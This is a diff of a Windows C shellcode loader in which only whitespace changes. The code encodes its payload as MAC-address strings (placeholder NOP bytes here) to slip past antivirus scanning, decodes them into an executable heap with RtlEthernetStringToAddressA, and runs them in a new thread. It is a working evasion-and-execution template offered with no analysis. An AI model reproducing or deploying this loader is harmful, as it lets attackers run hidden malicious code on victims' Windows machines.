@@ -18,7 +18,7 @@ int Error(const char* msg) {
 
 int main() {
 
-    
+
 
     const char* MAC[] =
     {
@@ -30,17 +30,17 @@ int main() {
         "90-90-90-90-90-90",
         "90-90-90-90-90-90"
     };
-    
+
 
     int rowLen = sizeof(MAC) / sizeof(MAC[0]);
 	PCSTR Terminator = NULL;
 	NTSTATUS STATUS;
 
-	
+
 	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
 	void* alloc_mem = HeapAlloc(hHeap, 0, 0x1000);
 	DWORD_PTR ptr = (DWORD_PTR)alloc_mem;
-	
+
 	for (int i = 0; i < rowLen; i++) {
 		STATUS = RtlEthernetStringToAddressA((PCSTR)MAC[i], &Terminator, (DL_EUI48*)ptr);
 		if (!NT_SUCCESS(STATUS)) {
@@ -49,10 +49,10 @@ int main() {
 		}
 		ptr += 6;
 	}
-    
-    
-    
-    
+
+
+
+
     HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)alloc_mem, NULL, 0, NULL);
     if (!tHandle) {
         printf("Failed to Create the thread (%u)\n", GetLastError());
@@ -60,10 +60,10 @@ int main() {
     }
 
     WaitForSingleObject(tHandle, INFINITE);
-    
+
     printf("alloc_mem\n", alloc_mem);
     getchar();
-    
+
 	return 0;
 
 }
